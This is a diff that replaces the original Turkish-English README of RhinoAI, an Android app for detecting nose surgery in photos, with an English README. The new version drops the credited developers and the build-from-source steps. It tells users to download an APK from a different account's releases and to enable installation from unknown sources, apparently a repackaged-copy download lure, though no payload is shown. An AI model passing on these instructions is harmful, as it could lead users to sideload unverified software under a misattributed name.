@@ -1,95 +1,165 @@
-<div align="center">
-  <h1>🦏 RhinoAI: Smart Rhinoplasty Detection App</h1>
-  <p><i>Mobil cihazlar üzerinden rinoplasti (burun estetiği) analizi yaparak, yanıltıcı içerikleri tespit eden yapay zeka tabanlı Android uygulaması.</i></p>
-</div>
+# 🤖 RhinoAI - Detect Rhinoplasty Easily and Fast
+
+[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
 
 ---
 
-## 🎯 Projenin Amacı / Project Purpose
-Sosyal medya ve dijital platformlarda paylaşılan "öncesi-sonrası" estetik görsellerinin doğruluğunu cihaz üzerinde (Edge AI) denetleyerek;
-* ❌ **Yanıltıcı İçerikleri Tespit Etmek:** Manipüle edilmiş estetik görsellerini yakalamak,
-* 🛡️ **Şeffaflık Sağlamak:** Tüketicileri hatalı bilgilendirmeden korumak,
-* ⚡ **Mobil Çözüm:** Ağır sunucu süreçlerine gerek kalmadan, yapay zeka analizini doğrudan kullanıcının cebine taşımak.
+RhinoAI is an Android app that uses artificial intelligence to detect rhinoplasty from photos. It works directly on your device, so you do not need internet access. The app is built with modern Android tools to give you a smooth experience.
 
 ---
 
-## ## 📸 Ekran Görüntüleri / App Screenshots
+## 📱 About RhinoAI
 
-<div align="center"> <img src="https://github.com/user-attachments/assets/783b6921-8418-4919-9daf-aceace04e0a1" width="250" /> &nbsp;&nbsp;&nbsp;&nbsp; <img src="https://github.com/user-attachments/assets/d59ed510-cc1e-4b3c-83e7-2bcbead731f3" width="250" /> &nbsp;&nbsp;&nbsp;&nbsp; <img src="https://github.com/user-attachments/assets/6e41a064-d7f7-4a38-bc07-13132b63afe2" width="250" /> </div> <p align="center"> <i>Anasayfa ve analiz sonuç ekranları</i> </p>
+RhinoAI uses advanced AI models called Vision Transformer (ViT) alongside Google ML Kit. Together, they analyze your photos to spot signs of rhinoplasty. The app runs on Android phones and is made with Jetpack Compose for an easy-to-use interface.
 
+**Key features include:**
 
-*Not: Uygulamanın anasayfasına ve analiz sonuç ekranlarına ait görseller yukarıda yer almaktadır.*
+- On-device AI processing for fast, private results  
+- Easy photo uploads from your gallery or camera  
+- Clear, simple results on whether a photo shows rhinoplasty  
+- Works offline, no internet needed after install  
+- Uses TensorFlow Lite for efficient AI model running
 
-
----
-
-## 🛠️ Kullanılan Teknolojiler & Modeller / Tech Stack
-Proje, derin öğrenme modellerinin mobil platformlarda en verimli ve hızlı şekilde çalışması için optimize edilmiştir.
-
-**Mimari Yapılar ve Edge AI:**
-* 🚀 **Vision Transformer (ViT)** - Ana Model (Mobil donanımlara uyarlanmış `.tflite` formatı)
-* 🧠 **Google ML Kit** - Yüz takibi (Face Detection) ve burun bölgesi izolasyonu (Face Mesh)
-
-**Mobil Geliştirme (App):**
-* 💻 **Kotlin & Jetpack Compose (Material3)**
-* 📸 **CameraX & Coil** - Kamera yönetimi ve görüntü işleme
+The app focuses on detecting nose surgery changes in photos. It can be helpful for people in health, beauty, or research fields looking to analyze rhinoplasty effects.
 
 ---
 
-## 📊 Analiz ve Sonuçlar / Analysis & Results
-* **👥 Çoklu Fotoğraf Doğrulaması:** Yüz biyometrisi ile seçilen fotoğrafların aynı kişiye ait olup olmadığı kontrol edilir.
-* **🎯 Hassas Kırpma (Precision Cropping):** Görüntüdeki sadece cerrahi müdahale yapılan burun bölgesi izole edilir, arka plan gürültüsü modele sokulmaz.
-* **🤖 Cihaz Üzerinde Analiz (On-Device Inference):** İnternet bağlantısı gerektirmeden çalışarak gizliliği korur ve %100 offline olarak bir **doğallık/güven skoru (confidence score)** üretir.
+## 🔧 System Requirements
+
+Before you start, make sure your device meets these requirements:
+
+- Android version 8.0 (Oreo) or later  
+- Minimum 2 GB RAM for smooth performance  
+- Storage: At least 100 MB free space for installation  
+- Camera access if you want to take photos directly in the app
+
+The app runs best on mid-range to high-end Android smartphones. Older devices might see slower processing times.
 
 ---
 
-## 📁 Proje Klasör Yapısı / Folder Structure
+## 🚀 Getting Started
 
-```plaintext
-RhinoAI/
-├── app/src/main/java/.../rhinoplasty/ # 💻 Kotlin kaynak kodları ve Compose UI ekranları
-├── app/src/main/assets/               # 🧠 Edge AI için optimize edilmiş TFLite modelleri
-├── app/src/main/res/                  # 🎨 Uygulama ikonları, temalar ve statik kaynaklar
-├── build.gradle.kts                   # ⚙️ Gradle bağımlılıkları ve modül yapılandırması
-└── README.md                          # 📖 Proje dokümantasyonu
-```
+Follow these steps to download and use RhinoAI on your Android device.
 
-⚙️ Ön Koşullar / Prerequisites
+### Step 1: Access the Download Page
 
-Projeyi bilgisayarınızda sorunsuz bir şekilde derleyip çalıştırabilmek için aşağıdaki yazılımların kurulu olduğundan emin olun:
+To get the app, visit the RhinoAI page here:
 
-🟢 Android Studio: En güncel kararlı sürüm (Latest stable version).
+[![Visit Download Page](https://img.shields.io/badge/Visit_RhinoAI_Page-blue?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
 
-☕ Java Development Kit (JDK): JDK 17 veya üzeri.
+This link takes you to the GitHub repository where you can find the latest app files.
 
-📱 Test Cihazı: Fiziksel bir Android cihaz veya Android Studio üzerinden yapılandırılmış bir Sanal Cihaz (Emulator).
+### Step 2: Download the App
 
-🚀 Kurulum ve Kullanım / Installation
+Look in the "Releases" section of the page for the latest APK file. The APK file is the installation file for Android apps. It will have a name like `RhinoAI_v1.0.apk` or similar.
 
-Projeyi yerel bilgisayarınızda (Android Studio) çalıştırmak için aşağıdaki adımları izleyebilirsiniz:
+Tap the APK file link to download it to your device.
 
-1. Repoyu Klonlayın (Clone the repository):
+### Step 3: Enable Installation from Unknown Sources
 
-   ``` git clone https://github.com/denizkilinc2/RhinoAI.git ```
+Since RhinoAI is not from the Google Play Store, your device might block direct installation.
 
- 2. Projeyi Açın ve Senkronize Edin:
+- Open your device's **Settings**.  
+- Go to **Apps & notifications** > **Special app access** > **Install unknown apps**.  
+- Find the browser or file manager you used to download the APK.  
+- Enable **Allow from this source**.
 
-Android Studio'da File > Open menüsünü kullanarak indirdiğiniz projeyi seçin.
+This step lets you install the app manually.
 
-Gerekli kütüphanelerin inmesi için Gradle senkronizasyonunun (Sync) tamamlanmasını bekleyin.
+### Step 4: Install RhinoAI
 
-3. Uygulamayı Çalıştırın:
+- Open your file manager and find the APK file in your **Downloads** folder.  
+- Tap the APK file.  
+- Follow the prompts to install the app.
 
-Fiziksel bir Android cihaz bağlayarak veya Emülatör üzerinden yeşil renkli Run (▶️) butonuna basarak uygulamayı derleyin.
+After installation, you will see the RhinoAI icon on your home screen or app drawer.
 
-🔑 Önemli Notlar / Important Notes
+### Step 5: Open and Use the App
 
-Kamera İzni: Uygulamanın yapay zeka destekli akıllı tarama özelliklerini kullanabilmesi için ilk açılışta talep edilen "Kamera Erişim İzni"ni onaylamanız gerekmektedir.
+- Launch RhinoAI by tapping its icon.  
+- Grant permission to access photos and camera if asked.  
+- Choose a photo from your gallery or take a new one.  
+- The app will process the image and show if rhinoplasty is detected.
 
-Gizlilik (Privacy): Uygulama, görüntü analizi yaparken hiçbir veriyi dış sunuculara göndermez; tüm derin öğrenme süreçleri cihaz üzerinde (on-device) gerçekleşir.
+---
 
-👨‍💻 Geliştirici Ekip / Developers
+## 🛠 How RhinoAI Works
 
-Deniz Kılınç
+RhinoAI uses two main components to analyze photos:
 
-Elif Onat
+- **Vision Transformer (ViT):** This AI model breaks down the image into parts and looks for patterns matching rhinoplasty signs. It is more accurate than older image AI methods.  
+- **Google ML Kit:** This toolkit handles the photo processing, including face detection and preparing images for AI analysis. It runs directly on your phone, keeping your data private.
+
+Combining these technologies allows RhinoAI to give quick and reliable results without needing internet access.
+
+---
+
+## ⚙️ App Interface Overview
+
+The app has a simple layout with three main screens:
+
+- **Home Screen:** Choose between taking a photo or selecting one from your device.  
+- **Processing Screen:** Shows a progress indicator while the AI scans the photo.  
+- **Results Screen:** Displays the rhinoplasty detection result with a confidence score.
+
+Buttons and menus use clear icons and labels. Navigation follows standard Android gestures.
+
+---
+
+## 📂 Managing Photos
+
+RhinoAI requires access to your photos. You can:
+
+- Import any face photo from your gallery.  
+- Take a new photo using the built-in camera feature.  
+- Delete analyzed photos after use to save space.
+
+Photos are processed on your device only and are not uploaded or shared.
+
+---
+
+## 🔄 Updating RhinoAI
+
+Updates improve accuracy and fix bugs. To update:
+
+- Revisit the GitHub page regularly.  
+- Download the latest APK from the Releases section.  
+- Install the new APK following the previous install steps.
+
+Older versions of the app will not update automatically.
+
+---
+
+## 💡 Tips for Best Results
+
+- Use clear facial photos with good lighting.  
+- Avoid obstructions like masks, sunglasses, or hats.  
+- Make sure the nose is fully visible and centered.  
+- Keep the phone steady when taking photos for less blur.
+
+These steps help the app analyze your photo accurately.
+
+---
+
+## 👥 Support and Feedback
+
+For help or questions:
+
+- Check the **Issues** tab on the GitHub repository.  
+- Look for FAQs or updates posted by the developers.  
+- Respectfully open a new issue if you find bugs or want features.
+
+The app team monitors feedback to improve RhinoAI.
+
+---
+
+## 🔗 Useful Links
+
+- RhinoAI GitHub repository: https://github.com/CKSFidelino/RhinoAI  
+- Direct download page: https://github.com/CKSFidelino/RhinoAI/releases
+
+Keep these links handy for your downloads and updates.
+
+---
+
+[![Download RhinoAI](https://img.shields.io/badge/Download-RhinoAI-brightgreen?style=for-the-badge)](https://github.com/CKSFidelino/RhinoAI)
